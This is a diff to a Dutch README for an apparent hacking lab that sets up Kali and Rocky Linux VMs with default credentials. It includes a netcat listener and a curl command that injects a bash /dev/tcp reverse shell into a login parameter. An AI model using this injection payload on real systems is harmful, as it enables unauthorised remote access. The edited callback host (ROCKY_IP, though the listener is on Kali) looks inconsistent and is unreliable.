@@ -10,9 +10,9 @@ Voordat je deze scripts uitvoert en u wilt geen foutmeldingen, download de VDI e
 
 Klik op deze [link](https://cdimage.kali.org/kali-2026.1/kali-linux-2026.1-virtualbox-amd64.7z) en er zal een 7Zip bestand worden gedownload. Als het is gedownload, dan moet u juist upzippen. Hierna ga je in de geünzipte folder gaan en dan het .VDI bestand verplaatsen naar [onze VDI folder](../src/VDI-folder/) in onze repo.
 
-### VDI AlmaLinux
+### VDI Rokcy 8
 
-Klik op deze [link](https://techloudgeek.com/download/image/?link=https://dlconusc1.linuxvmimages.com/046389e06777452db2ccf9a32efa3760:virtualbox/A/AlmaLinux/AlmaLinux_9.0_VBM.7z) en er zal een 7Zip bestand worden gedownload. Als het is gedownload, dan moet u juist upzippen. Hierna ga je in de geünzipte folder gaan en dan het .VDI bestand verplaatsen naar [onze VDI folder](../src/VDI-folder/) in onze repo.
+Klik op deze [link](https://www.linuxvmimages.com/images/rockylinux-8/) en er zal een 7Zip bestand worden gedownload. Als het is gedownload, dan moet u juist upzippen. Hierna ga je in de geünzipte folder gaan en dan het .VDI bestand verplaatsen naar [onze VDI folder](../src/VDI-folder/) in onze repo.
 
 ### Configuratie host-only adapter
 
@@ -47,7 +47,7 @@ username=kali
 
 password=kali
 
-## Opzet AlmaLinux
+## Opzet Rocky
 
 Voordat je het scipt uitvoer, kijk eerst eens in uw `known hosts`. Als daar nog een regel staat met `127.0.0.1` of `localhost`, dan moet je deze verwijderen.
 
@@ -63,9 +63,9 @@ We hebben ons script zo gemaakt, dat u als gebruiker moet u `enter` doen als de 
 
 ### Credentials
 
-username=almalinux
+username=rockylinux
 
-password=almalinux
+password=rockylinux
 
 ### Aanpassen keyboard
 
@@ -84,7 +84,7 @@ nc -lvnp 4444
 ## Exploit uitvoeren vanaf Kali
 
 ```bash
-curl -X POST "http://TARGET_IP:2031/login/index.php?login=$(bash -i >& /dev/tcp/KALI_IP/4444 0>&1)" \
+curl -X POST "http://TARGET_IP:2031/login/index.php?login=$(bash -i >& /dev/tcp/ROCKY_IP/4444 0>&1)" \
   -d "username=root" \
   -d "password=toor" \
   -d "commit=Login" \
